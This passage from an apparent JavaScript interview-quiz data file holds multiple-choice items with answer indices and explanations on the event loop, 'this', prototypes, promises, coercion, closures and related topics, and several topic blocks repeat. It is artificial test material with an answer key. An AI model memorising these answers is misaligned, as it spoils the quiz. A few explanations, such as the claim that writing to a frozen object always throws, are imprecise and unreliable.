  { q: "What does this print?\nasync function foo() {\n  console.log('B');\n  await Promise.resolve();\n  console.log('D');\n}\nconsole.log('A');\nfoo();\nconsole.log('C');", opts: ["A, B, C, D", "A, B, D, C", "A, D, B, C", "B, A, C, D"], correct: 0, explain: "A is sync. foo() runs: B is sync inside foo. await suspends foo (schedules continuation as microtask). C runs sync. Microtask fires: D runs. Order: A, B, C, D. The code after await is a microtask — runs after current sync code, before any macrotasks." },
  { q: "What happens if a microtask schedules another microtask?", opts: ["The new one waits for next tick", "It runs in the CURRENT microtask checkpoint — queue drains completely including newly added microtasks, potentially starving macrotasks", "It becomes a macrotask", "It throws an error"], correct: 1, explain: "Microtasks are processed until the queue is COMPLETELY empty, including new microtasks added during processing. An infinite microtask loop (Promise that always resolves to another Promise) will starve the event loop — no macrotasks, no UI updates, no setTimeout callbacks ever run." },
  { q: "What does this print?\nconsole.log(1);\nsetTimeout(() => console.log(2));\nPromise.resolve().then(() => console.log(3)).then(() => console.log(4));\nconsole.log(5);", opts: ["1,5,3,4,2", "1,2,3,4,5", "1,5,2,3,4", "1,5,4,3,2"], correct: 0, explain: "Sync: 1, 5. Microtask queue: .then(3) runs → logs 3, schedules .then(4) as new microtask. Microtask: 4 runs. Macrotask: setTimeout fires → 2. Final order: 1, 5, 3, 4, 2." },
],

'ji-this': [
  { q: "What are the four rules for determining 'this'?", opts: ["One rule: always refers to the class", "Default (global/undefined in strict), Implicit (object before dot), Explicit (call/apply/bind), new (constructor creates new object)", "Arrow function rule only", "Lexical scope only"], correct: 1, explain: "1. Default: standalone fn() → global or undefined (strict). 2. Implicit: obj.fn() → obj. 3. Explicit: fn.call(ctx) → ctx. 4. new: new Fn() → new object. Arrow functions don't follow these rules — they use lexical 'this' from where they were defined." },
  { q: "What does this print?\nconst obj = { x: 42, getX() { return this.x; } };\nconst fn = obj.getX;\nconsole.log(fn());", opts: ["42", "undefined", "TypeError", "null"], correct: 1, explain: "Extracting a method loses its binding. fn() is a standalone call — default binding. In strict mode: this is undefined, this.x throws. In non-strict: this is window, window.x is undefined. The implicit binding to obj is lost when the method is detached from the object." },
  { q: "What is the difference between call, apply, and bind?", opts: ["They are identical", "call: invoke immediately with individual args. apply: invoke immediately with args as array. bind: return a new permanently-bound function without invoking.", "bind is deprecated", "apply is for async only"], correct: 1, explain: "fn.call(ctx, a, b) — calls fn immediately, this=ctx, args individually. fn.apply(ctx, [a, b]) — same but args as array. fn.bind(ctx) — returns NEW function permanently bound to ctx, doesn't invoke. bind: for event handlers. call/apply: for borrowing methods." },
  { q: "What does this print?\nconst obj = {\n  x: 10,\n  getX: () => this.x\n};\nconsole.log(obj.getX());", opts: ["10", "undefined", "TypeError", "null"], correct: 1, explain: "Arrow function captures 'this' from where the object literal is DEFINED — the outer scope (global/module). The implicit obj binding is ignored by arrow functions. this.x in global scope is undefined. Don't use arrow functions as object methods if you need 'this'." },
  { q: "How do you permanently fix 'this' in a class method used as a callback?", opts: ["Use .call() every time", "Arrow class field: handleClick = () => {} OR bind in constructor: this.handleClick = this.handleClick.bind(this)", "Use var instead of const", "Add 'use strict'"], correct: 1, explain: "When passing this.handleClick as a callback (onClick={this.handleClick}), 'this' is lost — it's called as a standalone function. Arrow class field creates the method as an arrow function (lexical this). Constructor bind creates a permanently bound copy. Both are valid — arrow fields are more concise." },
],

'ji-prototype': [
  { q: "What is the prototype chain?", opts: ["A CSS selector pattern", "A chain of objects linked via [[Prototype]] — when a property isn't found on an object, JavaScript looks up the chain until it finds it or reaches null", "A design pattern", "An inheritance keyword"], correct: 1, explain: "Every object has an internal [[Prototype]] reference. Property lookup walks up the chain: object → its prototype → prototype's prototype → ... → Object.prototype → null. This is JavaScript's inheritance mechanism — how methods like toString() are available on every object." },
  { q: "What does Object.create(proto) do?", opts: ["Copies all properties from proto", "Creates a new object with proto as its [[Prototype]] — inherits proto's properties without calling a constructor", "Deep clones an object", "Creates a Proxy"], correct: 1, explain: "Object.create(proto) creates a new object whose [[Prototype]] is set to proto. The new object can access proto's properties via the prototype chain. Unlike new Constructor(), no constructor function is called — useful for pure prototypal inheritance." },
  { q: "What is the difference between __proto__ and prototype?", opts: ["They are identical", "__proto__: the actual prototype link on every object instance. prototype: a property on CONSTRUCTOR FUNCTIONS used when new is called.", "__proto__ is deprecated", "prototype is for classes only"], correct: 1, explain: "function Dog() {} — Dog.prototype is the object that new Dog() instances will inherit from. const d = new Dog() — d.__proto__ === Dog.prototype is true. __proto__ is the instance's chain link. prototype is the template on constructor functions." },
  { q: "What does 'class' syntax do under the hood?", opts: ["Creates true classes", "Syntactic sugar over prototypal inheritance — same prototype chain mechanics, cleaner syntax. class Animal is essentially function Animal() {} with methods on Animal.prototype.", "Creates isolated objects", "Enables multiple inheritance"], correct: 1, explain: "JavaScript classes are syntactic sugar. class Animal { speak() {} } is essentially function Animal() {} plus Animal.prototype.speak = function() {}. extends sets up the prototype chain. The runtime behavior is identical to ES5 prototype patterns." },
  { q: "What does instanceof check?", opts: ["The typeof value", "Whether Constructor.prototype appears anywhere in the object's prototype chain", "The object's class name string", "Direct parentage only"], correct: 1, explain: "dog instanceof Dog checks if Dog.prototype exists ANYWHERE in dog's prototype chain — not just direct parent. It can give unexpected results across iframes (different prototype objects for the same built-in types). For reliable type checking of custom classes, prefer constructor.name or a tag property." },
],

'ji-promises': [
  { q: "What does this chain return?\nPromise.resolve(1)\n  .then(x => x + 1)\n  .then(x => { throw new Error('oops'); })\n  .then(x => x + 1)\n  .catch(e => e.message);", opts: ["2", "3", "'oops'", "Error"], correct: 2, explain: "1→2 (first then). Throws Error (second then). Third then SKIPPED — rejection propagates. catch receives error, returns e.message = 'oops'. The catch handler returns a value so the chain resolves with 'oops' — catch recovers the chain." },
  { q: "What is the Promise constructor anti-pattern?", opts: ["Using async/await", "Wrapping an already-Promise-returning function in new Promise() unnecessarily", "Using .catch()", "Chaining .then()"], correct: 1, explain: "new Promise((res, rej) => { fetch('/api').then(res).catch(rej) }) — pointless. Just return fetch('/api'). Only use new Promise() when wrapping callback-based APIs (setTimeout, fs.readFile). Wrapping existing Promises adds complexity with zero benefit — called the 'deferred anti-pattern'." },
  { q: "What is the difference between Promise.all and Promise.allSettled?", opts: ["They are identical", "Promise.all rejects immediately if ANY promise rejects. Promise.allSettled waits for ALL to settle, returns outcomes of each — never rejects.", "allSettled is faster", "Promise.all is deprecated"], correct: 1, explain: "Promise.all: fail-fast — one rejection rejects everything. Promise.allSettled: waits for all, returns [{status:'fulfilled',value:...}, {status:'rejected',reason:...}]. Use .all when you need everything to succeed. Use .allSettled to handle partial failures gracefully." },
  { q: "What is Promise.race useful for?", opts: ["Finding the fastest server", "Returns the first Promise to settle — useful for implementing request timeouts: race a fetch against a timeout Promise", "Racing promises for fun", "Load balancing"], correct: 1, explain: "Promise.race([fetch('/api'), timeout(5000)]) — if the API takes over 5 seconds, the timeout Promise 'wins' and rejects the race. The fetch is still running but its result is ignored. Useful for timeouts without AbortController." },
  { q: "What happens if you don't return inside a .then() callback?", opts: ["Previous value is passed through", "The next .then() receives undefined — forgetting to return is one of the most common Promise chain bugs", "It throws an error", "The chain stops"], correct: 1, explain: "Each .then() returns a new Promise. Its resolved value is whatever you RETURN from the callback. If you forget return, the next handler gets undefined. Common bug: .then(res => { res.json(); }) — forgot return, next handler gets undefined instead of parsed JSON." },
],

'ji-coercion': [
  { q: "What does == (loose equality) do differently from ===?", opts: ["== is faster", "== performs type coercion before comparing. === compares type AND value with zero coercion.", "=== checks prototypes", "They are identical for numbers"], correct: 1, explain: "'' == 0 is true. null == undefined is true. false == 0 is true. These surprises are why most codebases mandate ===. The one useful == case: x == null catches both null AND undefined in a single check." },
  { q: "What is the result of [] + []?", opts: ["[]", "'' (empty string)", "0", "undefined"], correct: 1, explain: "Both arrays coerce to strings ([] → ''). '' + '' = ''. The + operator converts to string when either operand is a string or both coerce to string. [] + {} = '[object Object]'. {} + [] = 0 when {} is parsed as an empty statement block." },
  { q: "What values are falsy in JavaScript?", opts: ["false, null, undefined only", "false, 0, -0, 0n, '' (empty string), null, undefined, NaN — everything else is truthy", "false, null, undefined, [], {}", "false and 0 only"], correct: 1, explain: "Complete falsy list: false, 0, -0, 0n, '', null, undefined, NaN. Everything else is truthy — including [], {}, 'false', '0'. [] and {} being truthy surprises many developers. if ([]) runs the body." },
  { q: "What does typeof null return and why is it a bug?", opts: ["'null'", "'object' — a historical bug from 1995 that can't be fixed for backward compatibility", "'undefined'", "'empty'"], correct: 1, explain: "typeof null === 'object' is JavaScript's most famous bug. In the original implementation, null's type tag was 0 — same as objects. Fixing it would break existing code that checks typeof x === 'object'. Always check null explicitly: x === null." },
  { q: "What does NaN === NaN return and how do you check for NaN?", opts: ["true", "false — NaN is the only value not equal to itself. Use Number.isNaN() not isNaN()", "TypeError", "undefined"], correct: 1, explain: "NaN !== NaN — unique in JavaScript. isNaN('hello') returns true (coerces first — misleading). Number.isNaN('hello') returns false (no coercion — only true for actual NaN values). Always use Number.isNaN() for reliable NaN detection." },
],

'ji-immutability': [
  { q: "What is the difference between const and Object.freeze()?", opts: ["They are identical", "const prevents variable reassignment. Object.freeze() prevents property mutation. const obj = {} still allows obj.x = 1.", "const deep freezes", "freeze prevents reassignment"], correct: 1, explain: "const locks the BINDING — you can't point obj at a different object. But obj.name = 'changed' works fine. Object.freeze(obj) makes properties read-only. You need BOTH for a locked object: const obj = Object.freeze({})." },
  { q: "What does Object.freeze() do to nested objects?", opts: ["Deep freezes everything", "Shallow freeze only — top-level properties are frozen but nested objects are still mutable", "Throws an error on nested objects", "Auto-deep freezes"], correct: 1, explain: "Object.freeze() is SHALLOW. const obj = Object.freeze({ nested: { x: 1 } }) — obj.nested = {} throws, but obj.nested.x = 99 works! For deep immutability: recursively freeze, use Immer, or use a library like deep-freeze." },
  { q: "What is the difference between Object.freeze and Object.seal?", opts: ["They are identical", "freeze: no add/delete/modify. seal: no add/delete BUT can modify existing properties. Both are shallow.", "seal is stricter than freeze", "freeze is deprecated"], correct: 1, explain: "Object.freeze(): can't add, delete, or change any properties — truly immutable (shallow). Object.seal(): can't add or delete properties, but CAN change existing values. Use freeze for constants, seal when you want a fixed-shape object with mutable values." },
  { q: "How does Immer achieve immutability?", opts: ["Deep cloning everything", "Uses Proxy to let you write 'mutating' code that actually produces a new immutable copy — produce(state, draft => { draft.count++ })", "Uses Object.freeze internally", "Uses WeakMap"], correct: 1, explain: "Immer's produce() wraps state in a Proxy (draft). You write normal mutating code on draft. Immer records the changes and creates a new immutable copy. The original state is untouched. This is how Redux Toolkit's createSlice works internally." },
  { q: "Why is immutability important for React performance?", opts: ["It isn't important", "Immutability enables reference equality checks — React.memo and useMemo can compare prevProps === newProps in O(1) instead of deep equality checks", "It reduces memory usage", "It prevents re-renders entirely"], correct: 1, explain: "If you mutate state directly, the object reference stays the same — React.memo sees prevProps === newProps and skips re-render (showing stale UI). With immutability: new object = new reference = React knows something changed. This enables efficient shouldComponentUpdate and React.memo." },
],

'ji-debounce': [
  { q: "Implement debounce — what should it do?", opts: ["Call the function immediately", "Delay execution until N ms after the LAST call — resets timer on each call. Only fires once after activity stops.", "Call at most once per interval", "Queue all calls"], correct: 1, explain: "debounce(fn, 300): each call cancels the previous timer and sets a new 300ms timer. Only the final call (after 300ms of silence) executes fn. Use for: search input (fire after typing stops), form auto-save, resize handler." },
  { q: "What is the difference between debounce and throttle?", opts: ["They are identical", "Debounce: fires ONCE after activity STOPS. Throttle: fires at MOST once per interval regardless of call frequency.", "Throttle is faster", "Debounce is for clicks only"], correct: 1, explain: "Debounce: waits for silence — resets timer on each call. For: search, auto-save. Throttle: limits rate — fires immediately then ignores for N ms. For: scroll, resize, game loop. Wrong choice = too many calls (no limit) or missed updates (debounce on scroll = only fires when done scrolling)." },
  { q: "How do you implement debounce from scratch?", opts: ["Use setTimeout directly", "Store timer reference, clearTimeout on each call, setTimeout to schedule. Return a function that does this.", "Use requestAnimationFrame", "Use Proxy"], correct: 1, explain: "function debounce(fn, delay) { let timer; return function(...args) { clearTimeout(timer); timer = setTimeout(() => fn.apply(this, args), delay); }; } — store timer in closure. Each call cancels previous and reschedules. The key: clearTimeout before setTimeout." },
  { q: "What does the 'leading' option in Lodash debounce do?", opts: ["Fires before the trailing call", "Fires on the FIRST call immediately, then waits for silence before allowing another — gives instant feedback + rate limiting", "Fires in alphabetical order", "Adds a leading zero"], correct: 1, explain: "debounce(fn, 300, { leading: true }): fires immediately on first call, then suppresses calls during the 300ms window. Useful for: button that should respond instantly but prevent rapid double-clicks. Leading + trailing: fires on first call AND after silence." },
  { q: "How do you implement throttle from scratch?", opts: ["Same as debounce", "Track last run time, only execute if enough time has passed since last run", "Use setInterval", "Use requestAnimationFrame always"], correct: 1, explain: "function throttle(fn, limit) { let lastRun = 0; return function(...args) { const now = Date.now(); if (now - lastRun >= limit) { lastRun = now; fn.apply(this, args); } }; } — check elapsed time on each call. If enough time passed, run it and update lastRun." },
],

'ji-currying': [
  { q: "What is currying?", opts: ["A cooking technique in programming", "Transforming a function that takes multiple arguments into a chain of functions each taking one argument", "Partial application with all arguments", "A sorting algorithm"], correct: 1, explain: "curry(fn)(a)(b)(c) — instead of fn(a,b,c). Each call takes one argument and returns the next function until all arguments are collected. Enables partial application: const add5 = curriedAdd(5) — a reusable 'add 5 to anything' function." },
  { q: "What is the difference between currying and partial application?", opts: ["They are identical", "Currying: always unary (one arg at a time). Partial application: fix any number of arguments at once, creating a function needing fewer args.", "Partial application is currying with 2 args", "Currying is deprecated"], correct: 1, explain: "Currying: f(a)(b)(c) — strictly one argument at a time. Partial application: partial(fn, a, b)(c) — fix multiple at once. JavaScript's bind is partial application: fn.bind(null, a, b) returns a function needing only c. Libraries like Ramda support both." },
  { q: "Implement curry() that works for any arity. What's the key insight?", opts: ["Use recursion always", "Compare args.length to fn.length — if enough args collected, call fn. Otherwise return a function collecting more args.", "Use generators", "Use Proxy"], correct: 1, explain: "function curry(fn) { return function curried(...args) { if (args.length >= fn.length) return fn.apply(this, args); return function(...more) { return curried.apply(this, args.concat(more)); }; }; } — fn.length is arity. Keep collecting until we have enough." },
  { q: "What does compose(f, g, h)(x) do?", opts: ["Runs f, g, h independently", "f(g(h(x))) — applies functions right-to-left. h runs first, result passed to g, result passed to f.", "h(g(f(x)))", "Runs all functions in parallel"], correct: 1, explain: "compose applies functions right-to-left: compose(f, g, h)(x) = f(g(h(x))). Mathematical composition: (f ∘ g)(x). pipe() is the same but left-to-right: pipe(h, g, f)(x) = f(g(h(x))). pipe is more readable for data transformation pipelines." },
  { q: "What is a practical use case for currying in JavaScript?", opts: ["Only academic", "Event handlers with preset context, reusable filter/map functions, API call builders, validation rule factories", "Only in Haskell", "CSS generation"], correct: 1, explain: "Practical currying: const filterByStatus = status => items => items.filter(i => i.status === status). const getActive = filterByStatus('active'). Reuse getActive across different item lists. Or: const multiply = a => b => a * b; const double = multiply(2); const triple = multiply(3)." },
],
'ji-var-let-const': [
  { q: "What does this print?\nconsole.log(x);\nvar x = 5;", opts: ["5", "undefined", "ReferenceError", "null"], correct: 1, explain: "var is hoisted and initialized to undefined during the creation phase. The assignment stays in place. So console.log runs before x is assigned — prints undefined, not 5 or an error." },
  { q: "What does this print?\nconsole.log(y);\nlet y = 5;", opts: ["undefined", "5", "ReferenceError: Cannot access 'y' before initialization", "null"], correct: 2, explain: "let is hoisted but NOT initialized — it's in the Temporal Dead Zone (TDZ). Accessing it before the declaration line throws ReferenceError. This is intentional — prevents the confusing undefined behavior of var." },
  { q: "What is the Temporal Dead Zone?", opts: ["A deleted variable", "The period between a let/const variable being hoisted and its declaration line — accessing it throws ReferenceError", "A garbage collected variable", "A scope boundary"], correct: 1, explain: "let and const ARE hoisted (engine registers them during creation phase). But unlike var, they're not initialized to undefined. From scope start until the declaration line, they're in the TDZ — inaccessible. Temporal because it's time-based, not location-based." },
  { q: "What is the difference between const and Object.freeze()?", opts: ["They are identical", "const prevents reassignment of the variable binding. Object.freeze() prevents mutation of the object's properties. const obj = {} still allows obj.x = 1.", "const deep freezes objects", "Object.freeze() prevents reassignment"], correct: 1, explain: "const only locks the binding — the variable can't point to a different object. But the object itself is still mutable: obj.name = 'changed' works fine. Object.freeze(obj) makes the object's properties read-only (shallow). You need both for a truly locked object." },
  { q: "Which has block scope?", opts: ["var only", "let and const — they are scoped to the nearest { } block. var is function-scoped and ignores blocks.", "All three", "None of them"], correct: 1, explain: "var is function-scoped — it leaks out of if/for/while blocks into the enclosing function. let and const are block-scoped — they only exist within the { } they were declared in. This is why var in a for loop leaks the counter variable." },
  { q: "What does this print?\nfor (var i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 0);\n}", opts: ["0, 1, 2", "3, 3, 3", "0, 0, 0", "undefined x3"], correct: 1, explain: "var is function-scoped — all three callbacks close over the SAME i variable. By the time setTimeout fires, the loop is done and i is 3. Fix: use let (block-scoped — creates a new i per iteration) or an IIFE." },
],

'ji-closures': [
  { q: "What is a closure?", opts: ["A function with no parameters", "A function that retains access to variables from its outer scope even after that outer function has returned", "A private class method", "A self-invoking function"], correct: 1, explain: "A closure is formed when an inner function references variables from an outer function's scope. The inner function 'closes over' those variables — they're kept alive in memory even after the outer function returns." },
  { q: "What does this return?\nfunction makeAdder(x) {\n  return (y) => x + y;\n}\nconst add5 = makeAdder(5);\nadd5(3);", opts: ["undefined", "8", "5", "Error"], correct: 1, explain: "makeAdder(5) returns an arrow function that closes over x=5. Calling add5(3) executes that function with y=3, returning 5+3=8. This is partial application via closure — a common interview pattern." },
  { q: "Do closures hold a reference or a copy of outer variables?", opts: ["A copy of the value at creation time", "A live reference — the closure sees the CURRENT value of the variable, not the value when the closure was created", "A frozen snapshot", "It depends on the type"], correct: 1, explain: "Closures capture a LIVE REFERENCE to the variable — not a snapshot of its value. This is exactly why the var loop prints 3,3,3: all closures share the same i reference and see its final value. If closures copied values, it would print 0,1,2." },
  { q: "What is the module pattern and how does it use closures?", opts: ["An ES6 import pattern", "An IIFE that returns a public API while keeping private state hidden via closure — the returned functions close over private variables", "A class-based pattern", "A design framework"], correct: 1, explain: "const counter = (function() { let count = 0; return { inc: () => ++count, get: () => count }; })(). The returned object's methods close over count — it's private (not accessible from outside) but accessible to the methods. Classic encapsulation before ES6 classes." },
  { q: "What is a practical use case for closures?", opts: ["DOM manipulation only", "Memoization, factory functions, private state (module pattern), event handlers with captured context, partial application", "CSS animations", "HTTP requests"], correct: 1, explain: "Closures enable: private variables (module pattern), function factories (makeAdder), memoization (cache in outer scope), event handlers that remember context, React hooks (useState closes over its state slot index). They're fundamental to JavaScript patterns." },
],

'ji-event-loop': [
  { q: "What order does this print?\nconsole.log('A');\nsetTimeout(() => console.log('B'), 0);\nPromise.resolve().then(() => console.log('C'));\nconsole.log('D');", opts: ["A, B, C, D", "A, D, C, B", "A, D, B, C", "A, C, B, D"], correct: 1, explain: "A and D are synchronous — run immediately. Promise.then() goes to the microtask queue (HIGH priority). setTimeout goes to the macrotask queue (LOWER priority). After sync code: drain ALL microtasks (C) then one macrotask (B). Order: A, D, C, B." },
  { q: "What is the difference between microtasks and macrotasks?", opts: ["Speed difference only", "Microtasks (Promises, queueMicrotask) drain COMPLETELY before any macrotask (setTimeout, setInterval) runs", "Macrotasks run first", "They are the same"], correct: 1, explain: "After each task, ALL pending microtasks drain before the next macrotask starts. Promise.then() always runs before setTimeout(fn, 0) even though both are async. Microtasks: Promise callbacks, queueMicrotask, MutationObserver. Macrotasks: setTimeout, setInterval, I/O." },
  { q: "What does this print?\nasync function foo() {\n  console.log('B');\n  await Promise.resolve();\n  console.log('D');\n}\nconsole.log('A');\nfoo();\nconsole.log('C');", opts: ["A, B, C, D", "A, B, D, C", "A, D, B, C", "B, A, C, D"], correct: 0, explain: "A is sync. foo() runs: B is sync inside foo. await suspends foo (schedules continuation as microtask). C runs sync. Microtask fires: D runs. Order: A, B, C, D. The code after await is a microtask — runs after current sync code, before any macrotasks." },
  { q: "What happens if a microtask schedules another microtask?", opts: ["The new one waits for next tick", "It runs in the CURRENT microtask checkpoint — queue drains completely including newly added microtasks, potentially starving macrotasks", "It becomes a macrotask", "It throws an error"], correct: 1, explain: "Microtasks are processed until the queue is COMPLETELY empty, including new microtasks added during processing. An infinite microtask loop (Promise that always resolves to another Promise) will starve the event loop — no macrotasks, no UI updates, no setTimeout callbacks ever run." },
  { q: "What does this print?\nconsole.log(1);\nsetTimeout(() => console.log(2));\nPromise.resolve().then(() => console.log(3)).then(() => console.log(4));\nconsole.log(5);", opts: ["1,5,3,4,2", "1,2,3,4,5", "1,5,2,3,4", "1,5,4,3,2"], correct: 0, explain: "Sync: 1, 5. Microtask queue: .then(3) runs → logs 3, schedules .then(4) as new microtask. Microtask: 4 runs. Macrotask: setTimeout fires → 2. Final order: 1, 5, 3, 4, 2." },
],

'ji-this': [
  { q: "What are the four rules for determining 'this'?", opts: ["One rule: always refers to the class", "Default (global/undefined in strict), Implicit (object before dot), Explicit (call/apply/bind), new (constructor creates new object)", "Arrow function rule only", "Lexical scope only"], correct: 1, explain: "1. Default: standalone fn() → global or undefined (strict). 2. Implicit: obj.fn() → obj. 3. Explicit: fn.call(ctx) → ctx. 4. new: new Fn() → new object. Arrow functions don't follow these rules — they use lexical 'this' from where they were defined." },
  { q: "What does this print?\nconst obj = { x: 42, getX() { return this.x; } };\nconst fn = obj.getX;\nconsole.log(fn());", opts: ["42", "undefined", "TypeError", "null"], correct: 1, explain: "Extracting a method loses its binding. fn() is a standalone call — default binding. In strict mode: this is undefined, this.x throws. In non-strict: this is window, window.x is undefined. The implicit binding to obj is lost when the method is detached from the object." },
  { q: "What is the difference between call, apply, and bind?", opts: ["They are identical", "call: invoke immediately with individual args. apply: invoke immediately with args as array. bind: return a new permanently-bound function without invoking.", "bind is deprecated", "apply is for async only"], correct: 1, explain: "fn.call(ctx, a, b) — calls fn immediately, this=ctx, args individually. fn.apply(ctx, [a, b]) — same but args as array. fn.bind(ctx) — returns NEW function permanently bound to ctx, doesn't invoke. bind: for event handlers. call/apply: for borrowing methods." },
  { q: "What does this print?\nconst obj = {\n  x: 10,\n  getX: () => this.x\n};\nconsole.log(obj.getX());", opts: ["10", "undefined", "TypeError", "null"], correct: 1, explain: "Arrow function captures 'this' from where the object literal is DEFINED — the outer scope (global/module). The implicit obj binding is ignored by arrow functions. this.x in global scope is undefined. Don't use arrow functions as object methods if you need 'this'." },
  { q: "How do you permanently fix 'this' in a class method used as a callback?", opts: ["Use .call() every time", "Arrow class field: handleClick = () => {} OR bind in constructor: this.handleClick = this.handleClick.bind(this)", "Use var instead of const", "Add 'use strict'"], correct: 1, explain: "When passing this.handleClick as a callback (onClick={this.handleClick}), 'this' is lost — it's called as a standalone function. Arrow class field creates the method as an arrow function (lexical this). Constructor bind creates a permanently bound copy. Both are valid — arrow fields are more concise." },
],

'ji-prototype': [
  { q: "What is the prototype chain?", opts: ["A CSS selector pattern", "A chain of objects linked via [[Prototype]] — when a property isn't found on an object, JavaScript looks up the chain until it finds it or reaches null", "A design pattern", "An inheritance keyword"], correct: 1, explain: "Every object has an internal [[Prototype]] reference. Property lookup walks up the chain: object → its prototype → prototype's prototype → ... → Object.prototype → null. This is JavaScript's inheritance mechanism — how methods like toString() are available on every object." },
  { q: "What does Object.create(proto) do?", opts: ["Copies all properties from proto", "Creates a new object with proto as its [[Prototype]] — inherits proto's properties without calling a constructor", "Deep clones an object", "Creates a Proxy"], correct: 1, explain: "Object.create(proto) creates a new object whose [[Prototype]] is set to proto. The new object can access proto's properties via the prototype chain. Unlike new Constructor(), no constructor function is called — useful for pure prototypal inheritance." },
  { q: "What is the difference between __proto__ and prototype?", opts: ["They are identical", "__proto__: the actual prototype link on every object instance. prototype: a property on CONSTRUCTOR FUNCTIONS used when new is called.", "__proto__ is deprecated", "prototype is for classes only"], correct: 1, explain: "function Dog() {} — Dog.prototype is the object that new Dog() instances will inherit from. const d = new Dog() — d.__proto__ === Dog.prototype is true. __proto__ is the instance's chain link. prototype is the template on constructor functions." },
  { q: "What does 'class' syntax do under the hood?", opts: ["Creates true classes", "Syntactic sugar over prototypal inheritance — same prototype chain mechanics, cleaner syntax. class Animal is essentially function Animal() {} with methods on Animal.prototype.", "Creates isolated objects", "Enables multiple inheritance"], correct: 1, explain: "JavaScript classes are syntactic sugar. class Animal { speak() {} } is essentially function Animal() {} plus Animal.prototype.speak = function() {}. extends sets up the prototype chain. The runtime behavior is identical to ES5 prototype patterns." },
  { q: "What does instanceof check?", opts: ["The typeof value", "Whether Constructor.prototype appears anywhere in the object's prototype chain", "The object's class name string", "Direct parentage only"], correct: 1, explain: "dog instanceof Dog checks if Dog.prototype exists ANYWHERE in dog's prototype chain — not just direct parent. It can give unexpected results across iframes (different prototype objects for the same built-in types). For reliable type checking of custom classes, prefer constructor.name or a tag property." },
],

'ji-promises': [
  { q: "What does this chain return?\nPromise.resolve(1)\n  .then(x => x + 1)\n  .then(x => { throw new Error('oops'); })\n  .then(x => x + 1)\n  .catch(e => e.message);", opts: ["2", "3", "'oops'", "Error"], correct: 2, explain: "1→2 (first then). Throws Error (second then). Third then SKIPPED — rejection propagates. catch receives error, returns e.message = 'oops'. The catch handler returns a value so the chain resolves with 'oops' — catch recovers the chain." },
  { q: "What is the Promise constructor anti-pattern?", opts: ["Using async/await", "Wrapping an already-Promise-returning function in new Promise() unnecessarily", "Using .catch()", "Chaining .then()"], correct: 1, explain: "new Promise((res, rej) => { fetch('/api').then(res).catch(rej) }) — pointless. Just return fetch('/api'). Only use new Promise() when wrapping callback-based APIs (setTimeout, fs.readFile). Wrapping existing Promises adds complexity with zero benefit — called the 'deferred anti-pattern'." },
  { q: "What is the difference between Promise.all and Promise.allSettled?", opts: ["They are identical", "Promise.all rejects immediately if ANY promise rejects. Promise.allSettled waits for ALL to settle, returns outcomes of each — never rejects.", "allSettled is faster", "Promise.all is deprecated"], correct: 1, explain: "Promise.all: fail-fast — one rejection rejects everything. Promise.allSettled: waits for all, returns [{status:'fulfilled',value:...}, {status:'rejected',reason:...}]. Use .all when you need everything to succeed. Use .allSettled to handle partial failures gracefully." },
  { q: "What is Promise.race useful for?", opts: ["Finding the fastest server", "Returns the first Promise to settle — useful for implementing request timeouts: race a fetch against a timeout Promise", "Racing promises for fun", "Load balancing"], correct: 1, explain: "Promise.race([fetch('/api'), timeout(5000)]) — if the API takes over 5 seconds, the timeout Promise 'wins' and rejects the race. The fetch is still running but its result is ignored. Useful for timeouts without AbortController." },
  { q: "What happens if you don't return inside a .then() callback?", opts: ["Previous value is passed through", "The next .then() receives undefined — forgetting to return is one of the most common Promise chain bugs", "It throws an error", "The chain stops"], correct: 1, explain: "Each .then() returns a new Promise. Its resolved value is whatever you RETURN from the callback. If you forget return, the next handler gets undefined. Common bug: .then(res => { res.json(); }) — forgot return, next handler gets undefined instead of parsed JSON." },
],

'ji-coercion': [
  { q: "What does == (loose equality) do differently from ===?", opts: ["== is faster", "== performs type coercion before comparing. === compares type AND value with zero coercion.", "=== checks prototypes", "They are identical for numbers"], correct: 1, explain: "'' == 0 is true. null == undefined is true. false == 0 is true. These surprises are why most codebases mandate ===. The one useful == case: x == null catches both null AND undefined in a single check." },
  { q: "What is the result of [] + []?", opts: ["[]", "'' (empty string)", "0", "undefined"], correct: 1, explain: "Both arrays coerce to strings ([] → ''). '' + '' = ''. The + operator converts to string when either operand is a string or both coerce to string. [] + {} = '[object Object]'. {} + [] = 0 when {} is parsed as an empty statement block." },
  { q: "What values are falsy in JavaScript?", opts: ["false, null, undefined only", "false, 0, -0, 0n, '' (empty string), null, undefined, NaN — everything else is truthy", "false, null, undefined, [], {}", "false and 0 only"], correct: 1, explain: "Complete falsy list: false, 0, -0, 0n, '', null, undefined, NaN. Everything else is truthy — including [], {}, 'false', '0'. [] and {} being truthy surprises many developers. if ([]) runs the body." },
  { q: "What does typeof null return and why is it a bug?", opts: ["'null'", "'object' — a historical bug from 1995 that can't be fixed for backward compatibility", "'undefined'", "'empty'"], correct: 1, explain: "typeof null === 'object' is JavaScript's most famous bug. In the original implementation, null's type tag was 0 — same as objects. Fixing it would break existing code that checks typeof x === 'object'. Always check null explicitly: x === null." },
  { q: "What does NaN === NaN return and how do you check for NaN?", opts: ["true", "false — NaN is the only value not equal to itself. Use Number.isNaN() not isNaN()", "TypeError", "undefined"], correct: 1, explain: "NaN !== NaN — unique in JavaScript. isNaN('hello') returns true (coerces first — misleading). Number.isNaN('hello') returns false (no coercion — only true for actual NaN values). Always use Number.isNaN() for reliable NaN detection." },
],

'ji-immutability': [
  { q: "What is the difference between const and Object.freeze()?", opts: ["They are identical", "const prevents variable reassignment. Object.freeze() prevents property mutation. const obj = {} still allows obj.x = 1.", "const deep freezes", "freeze prevents reassignment"], correct: 1, explain: "const locks the BINDING — you can't point obj at a different object. But obj.name = 'changed' works fine. Object.freeze(obj) makes properties read-only. You need BOTH for a locked object: const obj = Object.freeze({})." },
  { q: "What does Object.freeze() do to nested objects?", opts: ["Deep freezes everything", "Shallow freeze only — top-level properties are frozen but nested objects are still mutable", "Throws an error on nested objects", "Auto-deep freezes"], correct: 1, explain: "Object.freeze() is SHALLOW. const obj = Object.freeze({ nested: { x: 1 } }) — obj.nested = {} throws, but obj.nested.x = 99 works! For deep immutability: recursively freeze, use Immer, or use a library like deep-freeze." },
  { q: "What is the difference between Object.freeze and Object.seal?", opts: ["They are identical", "freeze: no add/delete/modify. seal: no add/delete BUT can modify existing properties. Both are shallow.", "seal is stricter than freeze", "freeze is deprecated"], correct: 1, explain: "Object.freeze(): can't add, delete, or change any properties — truly immutable (shallow). Object.seal(): can't add or delete properties, but CAN change existing values. Use freeze for constants, seal when you want a fixed-shape object with mutable values." },
